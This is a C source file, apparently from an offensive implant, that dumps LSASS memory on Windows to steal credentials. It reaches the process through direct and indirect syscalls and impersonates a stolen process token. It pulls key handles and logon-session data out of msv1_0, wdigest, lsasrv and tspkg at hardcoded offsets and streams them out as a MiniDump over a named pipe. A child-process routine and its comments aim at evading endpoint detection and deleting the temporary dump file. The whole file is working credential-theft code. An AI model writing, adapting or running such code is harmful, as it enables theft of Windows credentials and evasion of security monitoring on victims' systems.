/**
 * LSASS memory dump — reads process memory via NtReadVirtualMemory,
 * streams as MiniDump format through the named pipe.
 * All allocations via NtAllocateVirtualMemory, OS version from PEB.
 */

#include <windows.h>
#include "../include/ntdefs.h"
#include "../include/syscalls.h"
#include "../include/agent.h"

#pragma pack(push, 1)

typedef struct _MDMP_HEADER {
    DWORD Signature;
    WORD  Version;
    WORD  ImplementationVersion;
    DWORD NumberOfStreams;
    DWORD StreamDirectoryRva;
    DWORD CheckSum;
    DWORD TimeDateStamp;
    ULONG64 Flags;
} MDMP_HEADER;

typedef struct _MDMP_DIRECTORY {
    DWORD StreamType;
    DWORD DataSize;
    DWORD Rva;
} MDMP_DIRECTORY;

typedef struct _MDMP_SYSTEM_INFO {
    WORD  ProcessorArchitecture;
    WORD  ProcessorLevel;
    WORD  ProcessorRevision;
    BYTE  NumberOfProcessors;
    BYTE  ProductType;
    DWORD MajorVersion;
    DWORD MinorVersion;
    DWORD BuildNumber;
    DWORD PlatformId;
    DWORD CSDVersionRva;
    WORD  SuiteMask;
    WORD  Reserved2;
    BYTE  CpuInfo[24];
} MDMP_SYSTEM_INFO;

typedef struct _MDMP_MEMORY_DESCRIPTOR64 {
    ULONG64 StartOfMemoryRange;
    ULONG64 DataSize;
} MDMP_MEMORY_DESCRIPTOR64;

typedef struct _MDMP_MEMORY64_LIST_HEADER {
    ULONG64 NumberOfMemoryRanges;
    ULONG64 BaseRva;
} MDMP_MEMORY64_LIST_HEADER;

#pragma pack(pop)

#define CSDVERSION_SIZE 8

typedef struct _MODULE_INFO {
    PVOID  base;
    DWORD  size;
    DWORD  timestamp;
    WCHAR  name[260];
    DWORD  name_len;
} MODULE_INFO;

#define MAX_MODULES 256

/* inline memset replacement */
static inline void zero_mem(void *dst, SIZE_T len) {
    BYTE *p = (BYTE *)dst;
    while (len--) *p++ = 0;
}

static DWORD enumerate_modules(HANDLE process, MODULE_INFO *modules, DWORD max_modules) {
    DWORD count = 0;
    PROCESS_BASIC_INFORMATION pbi;
    zero_mem(&pbi, sizeof(pbi));
    SIZE_T ret_len;

    NTSTATUS status = sys_NtQueryInformationProcess(
        process, ProcessBasicInformation, &pbi, sizeof(pbi), (PULONG)&ret_len
    );
    if (status != 0 || !pbi.PebBaseAddress) return 0;

    PEB peb;
    zero_mem(&peb, sizeof(peb));
    status = sys_NtReadVirtualMemory(process, pbi.PebBaseAddress, &peb, sizeof(peb), &ret_len);
    if (status != 0 || !peb.Ldr) return 0;

    PEB_LDR_DATA ldr;
    zero_mem(&ldr, sizeof(ldr));
    status = sys_NtReadVirtualMemory(process, peb.Ldr, &ldr, sizeof(ldr), &ret_len);
    if (status != 0) return 0;

    PVOID list_head = (BYTE*)peb.Ldr + FIELD_OFFSET(PEB_LDR_DATA, InMemoryOrderModuleList);
    PVOID current_link = ldr.InMemoryOrderModuleList.Flink;

    while (current_link != list_head && count < max_modules) {
        BYTE entry_buf[sizeof(LDR_DATA_TABLE_ENTRY)];
        zero_mem(entry_buf, sizeof(entry_buf));
        PVOID entry_addr = (BYTE*)current_link - 0x10;

        status = sys_NtReadVirtualMemory(process, entry_addr, entry_buf, sizeof(LDR_DATA_TABLE_ENTRY), &ret_len);
        if (status != 0) break;

        LDR_DATA_TABLE_ENTRY *entry = (LDR_DATA_TABLE_ENTRY *)entry_buf;

        if (entry->DllBase && entry->SizeOfImage) {
            modules[count].base = entry->DllBase;
            modules[count].size = entry->SizeOfImage;
            modules[count].timestamp = entry->TimeDateStamp;
            modules[count].name_len = 0;

            if (entry->FullDllName.Length && entry->FullDllName.Buffer) {
                DWORD name_bytes = entry->FullDllName.Length;
                if (name_bytes > sizeof(modules[count].name) - 2)
                    name_bytes = sizeof(modules[count].name) - 2;
                status = sys_NtReadVirtualMemory(process, entry->FullDllName.Buffer,
                    modules[count].name, name_bytes, &ret_len);
                if (status == 0) {
                    modules[count].name_len = name_bytes;
                    modules[count].name[name_bytes / 2] = 0;
                }
            }
            count++;
        }

        current_link = entry->InMemoryOrderLinks.Flink;
    }

    return count;
}

typedef struct _REGION_INFO {
    PVOID  base;
    SIZE_T size;
} REGION_INFO;

#define MAX_REGIONS 4096

static DWORD enumerate_regions(HANDLE process, REGION_INFO *regions, DWORD max_regions) {
    DWORD count = 0;
    PVOID addr = NULL;
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T ret_len;

    while (count < max_regions) {
        NTSTATUS status = sys_NtQueryVirtualMemory(
            process, addr, MemoryBasicInformation,
            &mbi, sizeof(mbi), &ret_len
        );

        if (status != 0) break;

        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect & (PAGE_READONLY | PAGE_READWRITE | PAGE_EXECUTE_READ |
                           PAGE_EXECUTE_READWRITE | PAGE_WRITECOPY | PAGE_EXECUTE_WRITECOPY)) &&
            !(mbi.Protect & PAGE_GUARD)) {
            regions[count].base = mbi.BaseAddress;
            regions[count].size = mbi.RegionSize;
            count++;
        }

        addr = (BYTE *)mbi.BaseAddress + mbi.RegionSize;
        if ((ULONG_PTR)addr < (ULONG_PTR)mbi.BaseAddress) break;
    }

    return count;
}

/* ── Helper: allocate memory via NtAllocateVirtualMemory ─── */

static PVOID alloc_mem(SIZE_T size) {
    PVOID base = NULL;
    SIZE_T region = size;
    NTSTATUS status = sys_NtAllocateVirtualMemory(
        (HANDLE)-1, &base, 0, &region,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );
    return NT_SUCCESS(status) ? base : NULL;
}

static void free_mem(PVOID ptr) {
    if (!ptr) return;
    SIZE_T size = 0;
    sys_NtFreeVirtualMemory((HANDLE)-1, &ptr, &size, MEM_RELEASE);
}

/* ── Token impersonation — steal a local process token ──── */

#define ProcessSessionInformation 24

static HANDLE impersonate_local_token(void) {
    if (!g_addr.NtDuplicateToken || !g_addr.NtSetInformationThread)
        return NULL;

    HANDLE cursor = NULL;
    HANDLE next = NULL;
    HANDLE imp_token = NULL;

    while (NT_SUCCESS(sys_NtGetNextProcess(cursor, PROCESS_QUERY_INFORMATION, 0, 0, &next))) {
        if (cursor) sys_NtClose(cursor);
        cursor = next;

        ULONG session_id = 0;
        ULONG ret;
        if (!NT_SUCCESS(sys_NtQueryInformationProcess(cursor, ProcessSessionInformation,
                &session_id, sizeof(session_id), &ret)))
            continue;
        if (session_id == 0)
            continue;

        HANDLE proc_token = NULL;
        if (!NT_SUCCESS(sys_NtOpenProcessToken(cursor,
                TOKEN_DUPLICATE | TOKEN_QUERY, &proc_token)))
            continue;

        SECURITY_QUALITY_OF_SERVICE sqos;
        zero_mem(&sqos, sizeof(sqos));
        sqos.Length = sizeof(sqos);
        sqos.ImpersonationLevel = SecurityImpersonation;

        OBJECT_ATTRIBUTES oa;
        zero_mem(&oa, sizeof(oa));
        oa.Length = sizeof(oa);
        oa.SecurityQualityOfService = &sqos;

        HANDLE dup = NULL;
        NTSTATUS st = sys_NtDuplicateToken(proc_token,
            TOKEN_QUERY | TOKEN_IMPERSONATE | TOKEN_DUPLICATE,
            &oa, FALSE, TokenImpersonation, &dup);
        sys_NtClose(proc_token);

        if (NT_SUCCESS(st) && dup) {
            imp_token = dup;
            break;
        }
    }
    if (cursor) sys_NtClose(cursor);

    if (imp_token) {
        HANDLE self_thread = (HANDLE)(LONG_PTR)-2;
        sys_NtSetInformationThread(self_thread, ThreadImpersonationToken,
                                   &imp_token, sizeof(imp_token));
    }
    return imp_token;
}

static void revert_impersonation(HANDLE token) {
    if (!token) return;
    HANDLE null_token = NULL;
    HANDLE self_thread = (HANDLE)(LONG_PTR)-2;
    sys_NtSetInformationThread(self_thread, ThreadImpersonationToken,
                               &null_token, sizeof(null_token));
    sys_NtClose(token);
}

static BOOL ends_with_ci(const WCHAR *s, DWORD s_chars, const WCHAR *suf, DWORD suf_chars) {
    if (s_chars < suf_chars) return FALSE;
    const WCHAR *p = s + s_chars - suf_chars;
    for (DWORD i = 0; i < suf_chars; i++) {
        WCHAR a = p[i], b = suf[i];
        if (a >= L'A' && a <= L'Z') a += 32;
        if (b >= L'A' && b <= L'Z') b += 32;
        if (a != b) return FALSE;
    }
    return TRUE;
}

/* ── Main dump function ──────────────────────────────────── */

BOOL dump_lsass(DWORD pid, HANDLE pipe) {
    HANDLE process = NULL;

    /* Find target process without CLIENT_ID */
    if (g_addr.NtGetNextProcess) {
        HANDLE cursor = NULL;
        HANDLE next = NULL;
        ACCESS_MASK access = PROCESS_QUERY_INFORMATION | PROCESS_VM_READ;
        while (NT_SUCCESS(sys_NtGetNextProcess(cursor, access, 0, 0, &next))) {
            if (cursor) sys_NtClose(cursor);
            cursor = next;
            PROCESS_BASIC_INFORMATION pbi;
            zero_mem(&pbi, sizeof(pbi));
            ULONG ret;
            if (NT_SUCCESS(sys_NtQueryInformationProcess(
                    cursor, ProcessBasicInformation, &pbi, sizeof(pbi), &ret))
                && (DWORD)(ULONG_PTR)pbi.UniqueProcessId == pid) {
                process = cursor;
                break;
            }
        }
        if (!process && cursor) sys_NtClose(cursor);
    }

    if (!process)
        return FALSE;

    HANDLE imp_token = impersonate_local_token();

    /* Enumerate modules from PEB */
    MODULE_INFO *modules = (MODULE_INFO *)alloc_mem(sizeof(MODULE_INFO) * MAX_MODULES);
    if (!modules) {
        sys_NtClose(process);
        return FALSE;
    }
    DWORD module_count = enumerate_modules(process, modules, MAX_MODULES);
    if (module_count == 0) {
        free_mem(modules);
        sys_NtClose(process);
        return FALSE;
    }

    REGION_INFO *regions = (REGION_INFO *)alloc_mem(sizeof(REGION_INFO) * MAX_REGIONS);
    if (!regions) {
        free_mem(modules);
        sys_NtClose(process);
        return FALSE;
    }
    DWORD region_count = 0;

    WCHAR s_msv[] = L"\\msv1_0.dll";
    WCHAR s_wdg[] = L"\\wdigest.dll";
    WCHAR s_srv[] = L"\\lsasrv.dll";
    WCHAR s_tsp[] = L"\\tspkg.dll";

    PVOID lsasrv_base = NULL;

    for (DWORD i = 0; i < module_count && region_count < MAX_REGIONS - 4; i++) {
        DWORD mc = modules[i].name_len / 2;

        if (ends_with_ci(modules[i].name, mc, s_msv, 11) ||
            ends_with_ci(modules[i].name, mc, s_wdg, 12) ||
            ends_with_ci(modules[i].name, mc, s_tsp, 10)) {
            regions[region_count].base = modules[i].base;
            regions[region_count].size = modules[i].size;
            region_count++;
        } else if (ends_with_ci(modules[i].name, mc, s_srv, 11)) {
            lsasrv_base = modules[i].base;
            regions[region_count].base = (BYTE *)modules[i].base + 0x175000;
            regions[region_count].size = 0xA000;
            region_count++;
        }
    }

    if (lsasrv_base) {
        BYTE *ldata = (BYTE *)alloc_mem(0xA000);
        if (ldata) {
            SIZE_T dr = 0;
            sys_NtReadVirtualMemory(process, (BYTE *)lsasrv_base + 0x175000,
                                    ldata, 0xA000, &dr);
            if (dr >= 0x8268) {
                PVOID aes_h = *(PVOID *)(ldata + 0x8258);
                PVOID des_h = *(PVOID *)(ldata + 0x8260);
                if (aes_h && region_count < MAX_REGIONS) {
                    regions[region_count].base = aes_h;
                    regions[region_count].size = 512;
                    region_count++;
                }
                if (des_h && region_count < MAX_REGIONS) {
                    regions[region_count].base = des_h;
                    regions[region_count].size = 512;
                    region_count++;
                }

                DWORD toff = 0x6620;
                for (DWORD b = 0; b < 32; b++) {
                    ULONG64 flink = *(ULONG64 *)(ldata + toff + b * 16);
                    ULONG64 ba = (ULONG64)((BYTE *)lsasrv_base + 0x175000
                                           + toff + b * 16);
                    if (flink == 0 || flink == ba || flink < 0x10000)
                        continue;

                    ULONG64 cur = flink;
                    for (int chain = 0; chain < 16 && cur && cur != ba
                         && cur > 0x10000; chain++) {
                        BYTE entry[0x120];
                        SIZE_T er = 0;
                        if (sys_NtReadVirtualMemory(process, (PVOID)cur,
                                entry, 0x120, &er) != 0 || er < 0x110)
                            break;

                        if (region_count < MAX_REGIONS) {
                            regions[region_count].base = (PVOID)cur;
                            regions[region_count].size = 0x120;
                            region_count++;
                        }

                        USHORT ul = *(USHORT *)(entry + 0x90);
                        ULONG64 up = *(ULONG64 *)(entry + 0x98);
                        if (up > 0x10000 && ul && ul < 512
                            && region_count < MAX_REGIONS) {
                            regions[region_count].base = (PVOID)up;
                            regions[region_count].size = ul;
                            region_count++;
                        }

                        USHORT dl = *(USHORT *)(entry + 0xA0);
                        ULONG64 dp = *(ULONG64 *)(entry + 0xA8);
                        if (dp > 0x10000 && dl && dl < 512
                            && region_count < MAX_REGIONS) {
                            regions[region_count].base = (PVOID)dp;
                            regions[region_count].size = dl;
                            region_count++;
                        }

                        ULONG64 cp = *(ULONG64 *)(entry + 0x108);
                        if (cp > 0x10000) {
                            BYTE cl[24];
                            SIZE_T cr = 0;
                            if (sys_NtReadVirtualMemory(process, (PVOID)cp,
                                    cl, 24, &cr) == 0 && cr >= 24) {
                                if (region_count < MAX_REGIONS) {
                                    regions[region_count].base = (PVOID)cp;
                                    regions[region_count].size = 24;
                                    region_count++;
                                }
                                ULONG64 pp = *(ULONG64 *)(cl + 16);
                                if (pp > 0x10000) {
                                    BYTE pm[40];
                                    SIZE_T pr = 0;
                                    if (sys_NtReadVirtualMemory(process,
                                            (PVOID)pp, pm, 40, &pr) == 0
                                        && pr >= 40) {
                                        if (region_count < MAX_REGIONS) {
                                            regions[region_count].base =
                                                (PVOID)pp;
                                            regions[region_count].size = 40;
                                            region_count++;
                                        }
                                        USHORT el =
                                            *(USHORT *)(pm + 24);
                                        ULONG64 ep =
                                            *(ULONG64 *)(pm + 32);
                                        if (ep > 0x10000 && el && el < 4096
                                            && region_count < MAX_REGIONS) {
                                            regions[region_count].base =
                                                (PVOID)ep;
                                            regions[region_count].size = el;
                                            region_count++;
                                        }
                                    }
                                }
                            }
                        }

                        cur = *(ULONG64 *)(entry + 0);
                    }
                }
            }
            free_mem(ldata);
        }
    }

    /* Layout: header + dirs + CSDVersion string + SystemInfo + modules + mem64list + data */
    DWORD num_streams = module_count > 0 ? 3 : 2;
    DWORD header_size = sizeof(MDMP_HEADER);
    DWORD dir_size = sizeof(MDMP_DIRECTORY) * num_streams;
    DWORD sysinfo_size = sizeof(MDMP_SYSTEM_INFO);

    DWORD csdver_rva = header_size + dir_size + sysinfo_size;

    DWORD module_list_size = 0;
    DWORD module_names_size = 0;
    if (module_count > 0) {
        module_list_size = 4 + 108 * module_count;
        for (DWORD i = 0; i < module_count; i++) {
            module_names_size += 4 + modules[i].name_len + 2;
            if ((modules[i].name_len + 2) % 4 != 0)
                module_names_size += 4 - ((modules[i].name_len + 2) % 4);
        }
    }

    DWORD mem64_header_size = sizeof(MDMP_MEMORY64_LIST_HEADER) +
                              sizeof(MDMP_MEMORY_DESCRIPTOR64) * region_count;

    DWORD sysinfo_rva = header_size + dir_size;
    DWORD modlist_rva = csdver_rva + CSDVERSION_SIZE;
    DWORD modnames_rva = modlist_rva + module_list_size;
    DWORD mem64_rva = modnames_rva + module_names_size;
    DWORD data_rva = mem64_rva + mem64_header_size;

    /* Header */
    MDMP_HEADER hdr;
    zero_mem(&hdr, sizeof(hdr));
    hdr.Signature = MDMP_SIGNATURE;
    hdr.Version = MDMP_VERSION;
    hdr.ImplementationVersion = 0;
    hdr.NumberOfStreams = num_streams;
    hdr.StreamDirectoryRva = header_size;
    hdr.CheckSum = 0;
    hdr.TimeDateStamp = get_tick();
    hdr.Flags = 0x00000002;  /* MiniDumpWithFullMemory */

    write_pipe(pipe, &hdr, sizeof(hdr));

    /* Stream directory */
    MDMP_DIRECTORY dirs[3];
    zero_mem(dirs, sizeof(dirs));
    DWORD di = 0;
    dirs[di].StreamType = STREAM_SYSTEM_INFO;
    dirs[di].DataSize = sysinfo_size;
    dirs[di].Rva = sysinfo_rva;
    di++;
    if (module_count > 0) {
        dirs[di].StreamType = STREAM_MODULE_LIST;
        dirs[di].DataSize = module_list_size;
        dirs[di].Rva = modlist_rva;
        di++;
    }
    dirs[di].StreamType = STREAM_MEMORY64_LIST;
    dirs[di].DataSize = mem64_header_size;
    dirs[di].Rva = mem64_rva;

    write_pipe(pipe, dirs, sizeof(MDMP_DIRECTORY) * num_streams);

    /* SystemInfo stream — version from PEB */
    MDMP_SYSTEM_INFO sysinfo;
    zero_mem(&sysinfo, sizeof(sysinfo));
    sysinfo.ProcessorArchitecture = 9;  /* AMD64 */
    sysinfo.NumberOfProcessors = 1;
    sysinfo.ProductType = 1;
    sysinfo.MajorVersion = get_os_major();
    sysinfo.MinorVersion = get_os_minor();
    sysinfo.BuildNumber = get_os_build();
    sysinfo.PlatformId = 2;  /* VER_PLATFORM_WIN32_NT */
    sysinfo.CSDVersionRva = csdver_rva;

    write_pipe(pipe, &sysinfo, sizeof(sysinfo));

    /* CSDVersion string: empty MINIDUMP_STRING */
    BYTE csdver[CSDVERSION_SIZE];
    zero_mem(csdver, CSDVERSION_SIZE);
    write_pipe(pipe, csdver, CSDVERSION_SIZE);

    /* ModuleList stream */
    if (module_count > 0) {
        write_pipe(pipe, &module_count, 4);

        DWORD name_rva_cursor = modnames_rva;

        for (DWORD i = 0; i < module_count; i++) {
            BYTE mod_entry[108];
            zero_mem(mod_entry, 108);
            *(ULONG64 *)&mod_entry[0] = (ULONG64)(ULONG_PTR)modules[i].base;
            *(DWORD *)&mod_entry[8] = modules[i].size;
            *(DWORD *)&mod_entry[12] = 0;
            *(DWORD *)&mod_entry[16] = modules[i].timestamp;
            *(DWORD *)&mod_entry[20] = name_rva_cursor;
            write_pipe(pipe, mod_entry, 108);

            DWORD str_size = 4 + modules[i].name_len + 2;
            if ((modules[i].name_len + 2) % 4 != 0)
                str_size += 4 - ((modules[i].name_len + 2) % 4);
            name_rva_cursor += str_size;
        }

        for (DWORD i = 0; i < module_count; i++) {
            DWORD byte_count = modules[i].name_len;
            write_pipe(pipe, &byte_count, 4);
            write_pipe(pipe, modules[i].name, byte_count);
            BYTE pad[6];
            zero_mem(pad, 6);
            DWORD pad_len = 2;
            if ((byte_count + 2) % 4 != 0)
                pad_len += 4 - ((byte_count + 2) % 4);
            write_pipe(pipe, pad, pad_len);
        }
    }

    /* Memory64List header */
    MDMP_MEMORY64_LIST_HEADER mem64hdr;
    zero_mem(&mem64hdr, sizeof(mem64hdr));
    mem64hdr.NumberOfMemoryRanges = region_count;
    mem64hdr.BaseRva = data_rva;
    write_pipe(pipe, &mem64hdr, sizeof(mem64hdr));

    /* Memory64 descriptors */
    for (DWORD i = 0; i < region_count; i++) {
        MDMP_MEMORY_DESCRIPTOR64 desc;
        desc.StartOfMemoryRange = (ULONG64)(ULONG_PTR)regions[i].base;
        desc.DataSize = regions[i].size;
        write_pipe(pipe, &desc, sizeof(desc));
    }

    /* Memory data — stream each region (large buffer, no delay — speed beats async EDR) */
    #define READ_BUF_SIZE 524288  /* 512KB */
    BYTE *buf = (BYTE *)alloc_mem(READ_BUF_SIZE);

    for (DWORD i = 0; i < region_count; i++) {
        SIZE_T remaining = regions[i].size;
        PVOID addr = regions[i].base;

        while (remaining > 0) {
            SIZE_T to_read = remaining > READ_BUF_SIZE ? READ_BUF_SIZE : remaining;
            SIZE_T bytes_read = 0;

            sys_NtReadVirtualMemory(process, addr, buf, to_read, &bytes_read);
            if (bytes_read == 0) {
                zero_mem(buf, (SIZE_T)to_read);
                bytes_read = to_read;
            } else if (bytes_read < to_read) {
                zero_mem(buf + bytes_read, (SIZE_T)(to_read - bytes_read));
                bytes_read = to_read;
            }

            write_pipe(pipe, buf, (DWORD)bytes_read);
            addr = (BYTE *)addr + bytes_read;
            remaining -= bytes_read;
        }
    }

    free_mem(buf);
    free_mem(regions);
    free_mem(modules);
    revert_impersonation(imp_token);
    sys_NtClose(process);

    return TRUE;
}

/* ── Parent-spoofed child process for LSASS dump ────────── */

typedef NTSTATUS (NTAPI *PFN_RtlCreatePPEx)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName, PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory, PUNICODE_STRING CommandLine,
    PVOID Environment, PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo, PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData, ULONG Flags);

typedef NTSTATUS (NTAPI *PFN_RtlDestroyPP)(
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters);

static int wlen(const wchar_t *s) { int n = 0; while (s[n]) n++; return n; }

static void itow(DWORD val, wchar_t *buf, int *pos) {
    wchar_t tmp[12];
    int n = 0;
    if (val == 0) { tmp[n++] = L'0'; }
    else { while (val > 0) { tmp[n++] = L'0' + (val % 10); val /= 10; } }
    for (int i = n - 1; i >= 0; i--) buf[(*pos)++] = tmp[i];
}

BOOL spawn_lsass_child(DWORD pid, HANDLE pipe, const wchar_t *output_name) {
    if (!g_addr.NtCreateUserProcess || !g_addr.NtWaitForSingleObject ||
        !g_addr.RtlCreateProcessParametersEx || !g_addr.RtlDestroyProcessParameters) {
        DWORD m = 0xDEAD0005; write_pipe(pipe, &m, 4);
        DWORD bits = 0;
        if (!g_addr.NtCreateUserProcess) bits |= 1;
        if (!g_addr.NtWaitForSingleObject) bits |= 2;
        if (!g_addr.RtlCreateProcessParametersEx) bits |= 4;
        if (!g_addr.RtlDestroyProcessParameters) bits |= 8;
        write_pipe(pipe, &bits, 4);
        return FALSE;
    }

    /* No process iteration — parent must not touch LSASS */

    /* Image path: \??\<our image path> */
    PUNICODE_STRING img = get_image_path();
    if (!img || !img->Buffer) return FALSE;

    wchar_t nt_img[520];
    int ni = 0;
    nt_img[ni++] = L'\\'; nt_img[ni++] = L'?';
    nt_img[ni++] = L'?';  nt_img[ni++] = L'\\';
    for (int i = 0; i < img->Length / 2 && ni < 516; i++)
        nt_img[ni++] = img->Buffer[i];
    nt_img[ni] = 0;

    UNICODE_STRING us_img;
    us_img.Length = (USHORT)(ni * sizeof(wchar_t));
    us_img.MaximumLength = us_img.Length + 2;
    us_img.Buffer = nt_img;

    /* Command line: "<image>" 10 <pid> c<output_name>
       mode 10 = 8|2 → child raw LSASS mode */
    wchar_t cmdline[520];
    int ci = 0;
    cmdline[ci++] = L'"';
    for (int i = 0; i < img->Length / 2 && ci < 300; i++)
        cmdline[ci++] = img->Buffer[i];
    cmdline[ci++] = L'"';
    cmdline[ci++] = L' ';
    cmdline[ci++] = L'1'; cmdline[ci++] = L'0';
    cmdline[ci++] = L' ';
    itow(pid, cmdline, &ci);
    cmdline[ci++] = L' ';
    cmdline[ci++] = L'c';
    const wchar_t *pn = output_name;
    while (*pn && ci < 510) cmdline[ci++] = *pn++;
    cmdline[ci] = 0;

    UNICODE_STRING us_cmd;
    us_cmd.Length = (USHORT)(ci * sizeof(wchar_t));
    us_cmd.MaximumLength = us_cmd.Length + 2;
    us_cmd.Buffer = cmdline;

    wchar_t curdir[] = L"C:\\Windows\\Temp";
    UNICODE_STRING us_cd;
    us_cd.Length = (USHORT)(wlen(curdir) * sizeof(wchar_t));
    us_cd.MaximumLength = us_cd.Length + 2;
    us_cd.Buffer = curdir;

    /* Build process parameters (Win32 path, not NT path) */
    PFN_RtlCreatePPEx rtl_create =
        (PFN_RtlCreatePPEx)g_addr.RtlCreateProcessParametersEx;
    PRTL_USER_PROCESS_PARAMETERS params = NULL;
    NTSTATUS st = rtl_create(&params, img, NULL, &us_cd, &us_cmd,
                              NULL, NULL, NULL, NULL, NULL,
                              RTL_USER_PROC_PARAMS_NORMALIZED);
    if (!NT_SUCCESS(st) || !params) {
        DWORD m = 0xDEAD0001; write_pipe(pipe, &m, 4);
        DWORD sc = (DWORD)st; write_pipe(pipe, &sc, 4);
        return FALSE;
    }

    /* PS_CREATE_INFO */
    PS_CREATE_INFO ci_info;
    zero_mem(&ci_info, sizeof(ci_info));
    ci_info.Size = sizeof(ci_info);

    /* PS_ATTRIBUTE_LIST: image name only (child inherits our parent) */
    PS_ATTRIBUTE_LIST attrs;
    zero_mem(&attrs, sizeof(attrs));
    attrs.TotalLength = sizeof(SIZE_T) + 1 * sizeof(PS_ATTRIBUTE);

    attrs.Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
    attrs.Attributes[0].Size = us_img.Length;
    attrs.Attributes[0].ValuePtr = us_img.Buffer;

    /* NtCreateUserProcess — 11 args → indirect_syscall_s7 */
    HANDLE child_proc = NULL, child_thread = NULL;
    st = indirect_syscall_s7(
        g_ssn.NtCreateUserProcess, g_addr.NtCreateUserProcess,
        &child_proc, &child_thread,
        (ULONG_PTR)0x001FFFFF, (ULONG_PTR)0x001FFFFF,
        (ULONG_PTR)0, (ULONG_PTR)0,
        (ULONG_PTR)0, (ULONG_PTR)0,
        params, &ci_info, &attrs);

    PFN_RtlDestroyPP rtl_destroy =
        (PFN_RtlDestroyPP)g_addr.RtlDestroyProcessParameters;
    rtl_destroy(params);

    if (!NT_SUCCESS(st) || !child_proc) {
        DWORD m = 0xDEAD0002; write_pipe(pipe, &m, 4);
        DWORD sc = (DWORD)st; write_pipe(pipe, &sc, 4);
        return FALSE;
    }

    /* Wait for child (120 seconds max) */
    LARGE_INTEGER timeout;
    timeout.QuadPart = -1200000000LL;
    sys_NtWaitForSingleObject(child_proc, FALSE, &timeout);
    sys_NtClose(child_proc);
    if (child_thread) sys_NtClose(child_thread);

    /* Read child's output: C:\Windows\Temp\c<output_name>.dat */
    wchar_t cpath[280];
    int cp = 0;
    wchar_t pfx[] = L"\\??\\C:\\Windows\\Temp\\c";
    for (int i = 0; pfx[i]; i++) cpath[cp++] = pfx[i];
    pn = output_name;
    while (*pn && cp < 270) cpath[cp++] = *pn++;
    cpath[cp++] = L'.'; cpath[cp++] = L'd';
    cpath[cp++] = L'a'; cpath[cp++] = L't';
    cpath[cp] = 0;

    UNICODE_STRING us_cp;
    us_cp.Length = (USHORT)(cp * sizeof(wchar_t));
    us_cp.MaximumLength = us_cp.Length + 2;
    us_cp.Buffer = cpath;

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &us_cp, OBJ_CASE_INSENSITIVE, NULL, NULL);

    IO_STATUS_BLOCK iosb;
    HANDLE hFile = NULL;
    st = sys_NtCreateFile(&hFile, 0x80110000, &oa, &iosb,
        NULL, 0, FILE_SHARE_READ | FILE_SHARE_DELETE,
        1 /* FILE_OPEN */, FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
        NULL, 0);
    if (!NT_SUCCESS(st) || !hFile) {
        DWORD m = 0xDEAD0003; write_pipe(pipe, &m, 4);
        DWORD sc = (DWORD)st; write_pipe(pipe, &sc, 4);
        return FALSE;
    }

    /* Pipe child's raw MDMP through parent's XOR cipher */
    BYTE *rbuf = (BYTE *)alloc_mem(65536);
    BOOL got_data = FALSE;
    if (rbuf) {
        for (;;) {
            IO_STATUS_BLOCK rio;
            st = sys_NtReadFile(hFile, NULL, NULL, NULL, &rio,
                                rbuf, 65536, NULL, NULL);
            if (!NT_SUCCESS(st) || rio.Information == 0) break;
            write_pipe(pipe, rbuf, (DWORD)rio.Information);
            got_data = TRUE;
        }
        free_mem(rbuf);
    }

    /* Delete child output file */
    FILE_DISPOSITION_INFORMATION disp;
    disp.DeleteFile = TRUE;
    sys_NtSetInformationFile(hFile, &iosb, &disp, sizeof(disp),
                              FileDispositionInformation);
    sys_NtClose(hFile);

    return got_data;
}
